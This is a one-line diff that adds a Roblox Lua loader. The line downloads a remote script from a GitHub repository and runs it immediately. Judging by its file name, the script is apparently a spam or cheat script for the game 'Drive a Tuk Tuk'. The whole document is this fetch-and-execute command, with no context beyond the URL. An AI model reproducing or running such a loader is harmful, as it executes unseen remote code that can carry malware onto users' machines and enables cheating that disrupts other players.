@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/drive-a-tuk-tuk-spam1-lfza7nj4fizoqe.lua"))()
